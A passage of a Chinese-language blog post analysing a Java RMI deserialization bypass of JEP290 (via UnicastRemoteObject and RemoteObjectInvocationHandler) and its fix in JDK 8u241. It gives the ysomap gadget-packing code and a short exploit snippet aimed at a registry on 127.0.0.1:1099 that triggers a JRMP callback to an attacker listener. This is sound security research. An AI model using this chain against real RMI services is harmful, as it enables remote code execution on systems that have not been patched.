+<p>看下过滤器<code>sun.rmi.transport.DGCImpl_Stub#leaseFilter</code>：一样对长度、深度、黑名单做了限制</p>
+<p>我们的payload用的是CC链，不在白名单范围内，于是GG。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (var1.isPrimitive()) &#123;</span><br><span class="line">    return Status.ALLOWED;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    return var1 != UID.class &amp;&amp; var1 != VMID.class &amp;&amp; var1 != Lease.class &amp;&amp; (var1.getPackage() == null || !Throwable.class.isAssignableFrom(var1) || !&quot;java.lang&quot;.equals(var1.getPackage().getName()) &amp;&amp; !&quot;java.rmi&quot;.equals(var1.getPackage().getName())) &amp;&amp; var1 != StackTraceElement.class &amp;&amp; var1 != ArrayList.class &amp;&amp; var1 != Object.class &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableList&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableCollection&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$UnmodifiableRandomAccessList&quot;) &amp;&amp; !var1.getName().equals(&quot;java.util.Collections$EmptyList&quot;) ? Status.REJECTED : Status.ALLOWED;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="来自An-Trinh的另一种绕过JEP290的思路"><a href="#来自An-Trinh的另一种绕过JEP290的思路" class="headerlink" title="来自An Trinh的另一种绕过JEP290的思路"></a>来自An Trinh的另一种绕过JEP290的思路</h2><p><strong>攻击者发送payload让RMI注册端发起一个JRMP请求去链接我们的JRMP服务器，然后接受并反序列化我们JRMP服务器返回的报错信息，反序列化的时候通过RMI注册端内部的利用链（比如CC）完成命令执行</strong></p>
+<p>An Trinh的绕过思路还是这个套路，JRMP的部分一模一样没有改变，与我们之前不同的是<strong>如何让RMI注册端发起JRMP请求这一部分</strong>。</p>
+<p>之前我们提出许多许多攻击方式：绕过客户端-自实现协议去封装、动态代理、UnicastRef类型参数实现Remote接口的类等等、甚至可以自定义一个符合要求的类来攻击。</p>
+<p>但是回归到这些攻击方式，其本质都是利用：</p>
+<ol>
+<li><strong>readobject反序列化的过程会递归反序列化我们的对象，一直反序列化到我们的UnicastRef类。</strong></li>
+<li><strong>在readobejct反序列化的过程中填装UnicastRef类到<code>incomingRefTable</code></strong></li>
+<li><strong>在releaseInputStream语句中从incomingRefTable中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>(后两步是发起JRMP请求的细节，在 UnicastRef对象 一节中有详细说到，可以粗糙的理解成readobject出发了JRMP查询也没事)</p>
+<hr>
+<p>但是An Trinh提出了一个新的思路来发起JRMP请求，不是利用<strong>readobject的递归-填装-触发</strong>的模式，而是<strong>readobject函数调用过程</strong>直接触发JRMP请求。</p>
+<p>但是为什么说他鸡肋呢？因为他的payload攻击过程中：会<strong>在readobject函数中触发他的Gadgets发起JRMP连接</strong>，但是在完成后，又会回到我们的<strong>readobject的递归-填装-触发</strong>的模式中发起第二次JRMP连接。具体流程如下：</p>
+<ol>
+<li><strong>readobject递归反序列化到payload对象中的UnicastRef对象，填装UnicastRef对象的ref到<code>incomingRefTable</code></strong></li>
+<li><strong>在根据readobject的第二个最著名的特性：会调用对象自实现的readobject方法，会执行UnicastRemoteObject的readObject，他的Gadgets会在这里触发一次JRMP请求</strong></li>
+<li><strong>在releaseInputStream语句中从<code>incomingRefTable</code>中读取ref进行开始JRMP请求</strong></li>
+</ol>
+<p>同时他Gadgets发起JRMP请求只会发起<strong>一次请求</strong>，而readobject的递归-填装-触发的JRMP请求，由于会检测DGC是否绑定成功会<strong>循环发起JRMP</strong>，形成天然的心跳木马。</p>
+<p>先给出ysomap里的封装过程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">public UnicastRemoteObject pack(Object obj) throws Exception &#123;</span><br><span class="line">    //1.UnicastRef对象 -&gt; RemoteObjectInvocationHandler</span><br><span class="line">    //obj是UnicastRef对象，先RemoteObjectInvocationHandler封装</span><br><span class="line">    RemoteObjectInvocationHandler handler = new RemoteObjectInvocationHandler((RemoteRef) obj);</span><br><span class="line">    //2. RemoteObjectInvocationHandler -&gt; RMIServerSocketFactory接口</span><br><span class="line">    //RemoteObjectInvocationHandler通过动态代理封装转化成RMIServerSocketFactory</span><br><span class="line">    RMIServerSocketFactory serverSocketFactory = (RMIServerSocketFactory) Proxy.newProxyInstance(</span><br><span class="line">        RMIServerSocketFactory.class.getClassLoader(),// classloader</span><br><span class="line">        new Class[] &#123; RMIServerSocketFactory.class, Remote.class&#125;, // interfaces to implements</span><br><span class="line">        handler// RemoteObjectInvocationHandler</span><br><span class="line">        );</span><br><span class="line">    //通过反射机制破除构造方法的可见性性质，创建UnicastRemoteObject实例</span><br><span class="line">    Constructor&lt;?&gt; constructor = UnicastRemoteObject.class.getDeclaredConstructor(null); // 获取默认的</span><br><span class="line">    constructor.setAccessible(true);</span><br><span class="line">    UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);</span><br><span class="line">    //3. RMIServerSocketFactory -&gt; UnicastRemoteObject</span><br><span class="line">    //把RMIServerSocketFactory塞进UnicastRemoteObject实例中</span><br><span class="line">    ReflectionHelper.setFieldValue(remoteObject, &quot;ssf&quot;, serverSocketFactory);</span><br><span class="line">    return remoteObject;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>走一遍这条gadget</p>
+<p>从UnicastRemoteObject的readObject入口开始<code>java.rmi.server.UnicastRemoteObject#readObject</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream in)</span><br><span class="line">        throws java.io.IOException, java.lang.ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">        reexport();//这里</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>java.rmi.server.UnicastRemoteObject#reexport</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private void reexport() throws RemoteException</span><br><span class="line">    &#123;</span><br><span class="line">        if (csf == null &amp;&amp; ssf == null) &#123;</span><br><span class="line">            exportObject((Remote) this, port);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //payload是填充了ssf的,这里</span><br><span class="line">            exportObject((Remote) this, port, csf, ssf);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>之后的调用链很长我们直接跳到<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>这里是第二个关键处动态代理的特性，跳转到拦截器的invoke（这里的动态代理是不仅用到了接口转换的特性，用到了拦截的特性！惊了！激动！）</p>
+<p><code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket newServerSocket() throws IOException &#123;</span><br><span class="line">    if (TCPTransport.tcpLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.VERBOSE, &quot;creating server socket on &quot; + this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object var1 = this.ssf;</span><br><span class="line">    if (var1 == null) &#123;</span><br><span class="line">        var1 = chooseFactory();</span><br><span class="line">    &#125;</span><br><span class="line">    //var1就是我们的payload中构建的ssf.调用他的createServerSocket</span><br><span class="line">    //会根据动态代理进入RemoteObjectInvocationHandler#invoke</span><br><span class="line">    ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);</span><br><span class="line">    if (this.listenPort == 0) &#123;</span><br><span class="line">        setDefaultPort(var2.getLocalPort(), this.csf, this.ssf);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>java.rmi.server.RemoteObjectInvocationHandler#invoke</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object proxy, Method method, Object[] args)</span><br><span class="line">        throws Throwable</span><br><span class="line">    &#123;</span><br><span class="line">    //method是java.rmi.server.RMIServerSocketFactory的createServerSocket方法</span><br><span class="line">        //....</span><br><span class="line">        //这边都不满足</span><br><span class="line">        if (method.getDeclaringClass() == Object.class) &#123;</span><br><span class="line">            return invokeObjectMethod(proxy, method, args);</span><br><span class="line">        &#125; else if (&quot;finalize&quot;.equals(method.getName()) &amp;&amp; method.getParameterCount() == 0 &amp;&amp;</span><br><span class="line">            !allowFinalizeInvocation) &#123;</span><br><span class="line">            return null; // ignore</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            //进入此处</span><br><span class="line">            return invokeRemoteMethod(proxy, method, args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">private Object invokeRemoteMethod(Object proxy,</span><br><span class="line">                                  Method method,</span><br><span class="line">                                  Object[] args)</span><br><span class="line">    throws Exception</span><br><span class="line">    &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (!(proxy instanceof Remote)) &#123;</span><br><span class="line">                throw new IllegalArgumentException(</span><br><span class="line">                    &quot;proxy not Remote instance&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">          //我们payload把RemoteObjectInvocationHandler的ref写成了JRMP恶意服务器地址</span><br><span class="line">          //这里开始了触发JRMP请求</span><br><span class="line">            return ref.invoke((Remote) proxy, method, args,</span><br><span class="line">                              getMethodHash(method));</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>令人激动的<code>sun.rmi.server.UnicastRef#invoke</code>我们之前JRMP触发就是在这里触发的，但是之前是<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>虽然接口是不一样，但是做的事情差不多</p>
+<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.Remote, java.lang.reflect.Method, java.lang.Object[], long)</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Remote var1, Method var2, Object[] var3, long var4) throws Exception &#123;</span><br><span class="line">        //省略部分代码...  </span><br><span class="line">        //从ref中获取连接</span><br><span class="line">        Connection var6 = this.ref.getChannel().newConnection();</span><br><span class="line">        StreamRemoteCall var7 = null;</span><br><span class="line">        boolean var8 = true;</span><br><span class="line">        boolean var9 = false;</span><br><span class="line">        Object var13;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (clientRefLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">                clientRefLog.log(Log.VERBOSE, &quot;opnum = &quot; + var4);</span><br><span class="line">            &#125;</span><br><span class="line">           //********对ref发起JRMP请求**********</span><br><span class="line">            var7 = new StreamRemoteCall(var6, this.ref.getObjID(), -1, var4);</span><br><span class="line">           //处理结果</span><br><span class="line">            Object var11;</span><br><span class="line">            try &#123;</span><br><span class="line">                ObjectOutput var10 = var7.getOutputStream();</span><br><span class="line">                this.marshalCustomCallData(var10);</span><br><span class="line">                var11 = var2.getParameterTypes();</span><br><span class="line"></span><br><span class="line">                for(int var12 = 0; var12 &lt; ((Object[])var11).length; ++var12) &#123;</span><br><span class="line">                    marshalValue((Class)((Object[])var11)[var12], var3[var12], var10);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (IOException var39) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF, &quot;IOException marshalling arguments: &quot;, var39);</span><br><span class="line">                throw new MarshalException(&quot;error marshalling arguments&quot;, var39);</span><br><span class="line">            &#125;</span><br><span class="line">           //*******JRMP服务端返回信息，反序列化触发处*******</span><br><span class="line">            var7.executeCall();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>JRMP请求已经发起了并且返回包也收到了，接下来的报错信息饭反序列化触发点就一样了</p>
+<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public void executeCall() throws Exception &#123;</span><br><span class="line">//..省略</span><br><span class="line">  switch(var1) &#123;</span><br><span class="line">        case 1:</span><br><span class="line">            return;</span><br><span class="line">        case 2:</span><br><span class="line">            Object var14;</span><br><span class="line">            try &#123;</span><br><span class="line">            //***这里触发反序列化JRMP服务端的返回的恶意对象***</span><br><span class="line">                var14 = this.in.readObject();</span><br><span class="line">            &#125; catch (Exception var10) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>总结三个关键点：</p>
+<ol>
+<li>利用readobject的复写特性执行UnicastRemoteObject的readObject</li>
+<li>利用动态代理的拦截执行invoke的特性，在UnicastRemoteObject#readObject的调用链中执行<code>proxy对象.createServerSocket</code>跳到了RemoteObjectInvocationHandler的invoke方法</li>
+<li>RemoteObjectInvocationHandler的invoke方法可以根据内置的ref向外发起JRMP连接，再反序列化返回结果</li>
+</ol>
+<h3 id="复现—绕过8u231"><a href="#复现—绕过8u231" class="headerlink" title="复现—绕过8u231"></a>复现—绕过8u231</h3><p>利用ysomap的RMIConnectWithUnicastRemoteObject模块：</p>
+<pre><code>RMIConnectWithUnicastRemoteObject payload = new RMIConnectWithUnicastRemoteObject();
+Bullet bullet = payload.getDefaultBullet(&quot;127.0.0.1&quot;,&quot;1199&quot;);
+payload.setBullet(bullet);
+
+RMIRegistryExploit RMIexploit = new RMIRegistryExploit();
+RMIexploit.target=&quot;127.0.0.1:1099&quot;;
+RMIexploit.payload=payload;
+RMIexploit.run();
+</code></pre>
+<p>我们来看看是如何做到的！同样从231u11的两处修复出发：</p>
+<ol>
+<li><code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>报错情况消除ref<br>看上面的触发流程，你就知道为啥绕过了。<br>这项修复针对的是<strong>readobject的递归-填装-触发模式</strong>JRMP请求发起，在readobject中利用复写的Gadagets完全不受这个ref清除操作的影响。完美！</li>
+<li><code>sun.rmi.transport.DGCImpl_Stub#dirty</code>提前了黑名单<br>这是针对在JRMP触发链获取到JRMP服务器之后的一个黑名单拦截修复。<br>但是看看上面利用成功调用栈，会发现这个调用栈压根不走DGC层的dirty，而是直接调用了ref的invoke，相当于绕过了之前触发链的黑名单拦截。</li>
+</ol>
+<h3 id="8u241的修复第一处"><a href="#8u241的修复第一处" class="headerlink" title="8u241的修复第一处"></a>8u241的修复第一处</h3><p>在8u241版本，针对这个绕过链进行了修复：修复说明在<a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/8u241-relnotes-5813177.html#JDK-8230967">Oracle官网也有说明</a></p>
+<p>重点就是把应该是String的地方从本来的<code>(String)var9.readobject()</code>改成了<br><code>SharedSecrets.getJavaObjectInputStreamReadString().readString(var9);</code>前者是可以反序列化Object的，但是后者就完全不接受反序列化Object。</p>
+<p>为什么不接受反序列化Object呢，调试跟进看readString里面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">private String readString() throws IOException &#123;</span><br><span class="line">    try &#123;</span><br><span class="line">        return (String) readObject(String.class);//进入此处</span><br><span class="line">    &#125; catch (ClassNotFoundException cnf) &#123;</span><br><span class="line">        throw new IllegalStateException(cnf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>调用了<code>java.io.ObjectInputStream#readObject(java.lang.Class&lt;?&gt;)</code>，这个readString进来的接口跟我们平时调用readObject不一样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//平时调用的</span><br><span class="line">public final Object readObject()</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    return readObject(Object.class);//我们平常会进入此处</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>readObject(Object.class);</code>与<code>readObject(String.class);</code></p>
+<p>在<code>java.io.ObjectInputStream#readObject(type)</code>会进行一些无关竟要的操作然后传递type<br>进入<code>java.io.ObjectInputStream#readObject0(type)</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//8u241时这里，type传入String</span><br><span class="line">private Object readObject0(Class&lt;?&gt; type, boolean unshared) throws IOException &#123;</span><br><span class="line">    //...</span><br><span class="line">    case TC_OBJECT://我们输入的payload对象是一个Object</span><br><span class="line">        if (type == String.class) &#123;</span><br><span class="line">            //8u241 type=String 直接在此处报错不进行反序列化了</span><br><span class="line">        throw new ClassCastException(&quot;Cannot cast an object to java.lang.String&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        //之前的版本都是传入type=Object于是正常反序列化</span><br><span class="line">        return checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">    //..</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>所以在8u241中，如果参数应该是String的反序列化点就直接拒绝了Object的反序列化，杜绝了我们的上面的Gadgets。</p>
+<h3 id="8u241的修复第二处"><a href="#8u241的修复第二处" class="headerlink" title="8u241的修复第二处"></a>8u241的修复第二处</h3><p>8u241还修复了调用栈中的<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法。</p>
+<p>添加了一处针对传入method的验证。</p>
+<p><img src="/images/20230430170309.png"></p>
+<p>这个的method是从<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(this.listenPort);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于动态代理特性过来的，method就是createServerSocket这个方法，然而它理所当然不是一个remote接口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public interface RMIServerSocketFactory &#123;</span><br><span class="line"></span><br><span class="line">    public ServerSocket createServerSocket(int port)</span><br><span class="line">        throws IOException;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>###最后借用大佬的图总结</p>
+<p><img src="/images/20230430172816.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag"><i class="fas fa-tag"></i> java安全</a>
+          
+            <a href="/tags/RMI/" rel="tag"><i class="fas fa-tag"></i> RMI</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div>
+	  <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    1azysugar
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://1azy.icu/2023/04/03/Java-RMI/" title="Java RMI攻击原理分析">http://1azy.icu/2023/04/03/Java-RMI/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议，转载请注明出处！
+  </li>
+</ul>
+
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2023/03/15/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E2%80%94CC%E9%93%BE/" rel="next" title="Java反序列化——CC链">
+                <i class="fas fa-chevron-left"></i> Java反序列化——CC链
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2023/04/15/JNDI-Injection/" rel="prev" title="JNDI注入原理分析">
+                JNDI注入原理分析 <i class="fas fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+	        <img class="site-author-image" itemprop="image"
+                  src="/images/avatar.jpg"
+                  alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/lazysugar" target="_blank" title="GitHub">
+                      
+		      
+			<i class="fa-fw fab fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:1613664134@qq.com" target="_blank" title="E-Mail">
+                      
+		      
+			<i class="fa-fw fas fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+            <div class="cc-license motion-element" itemprop="license">
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+                <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+              </a>
+            </div>
+          
+
+          
+          
+
+          
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#RMI%E5%AD%A6%E4%B9%A0"><span class="nav-number">1.</span> <span class="nav-text">RMI学习</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#RMI%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.1.</span> <span class="nav-text">RMI详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B%E6%8B%86%E8%A7%A3"><span class="nav-number">1.2.</span> <span class="nav-text">过程拆解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI-registry"><span class="nav-number">1.2.1.</span> <span class="nav-text">RMI registry</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E7%B1%BB"><span class="nav-number">1.2.2.</span> <span class="nav-text">RMI动态加载类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-SecurityManager%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6"><span class="nav-number">1.2.3.</span> <span class="nav-text">Java SecurityManager安全管理机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF%E4%B8%80%EF%BC%9AClient%E7%AB%AF%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BDServer%E7%AB%AFObj"><span class="nav-number">1.2.4.</span> <span class="nav-text">场景一：Client端动态加载Server端Obj</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">源码分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JRMI%E5%8D%8F%E8%AE%AE%E6%BA%90%E7%A0%81%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.4.</span> <span class="nav-text">JRMI协议源码详解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B5%81%E9%87%8F%E6%80%BB%E7%BB%93"><span class="nav-number">1.4.1.</span> <span class="nav-text">流量总结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DGC%E8%AF%A6%E8%A7%A3"><span class="nav-number">1.6.</span> <span class="nav-text">DGC详解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JEP290%E8%AF%A6%E8%A7%A3%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="nav-number">1.7.</span> <span class="nav-text">JEP290详解与绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 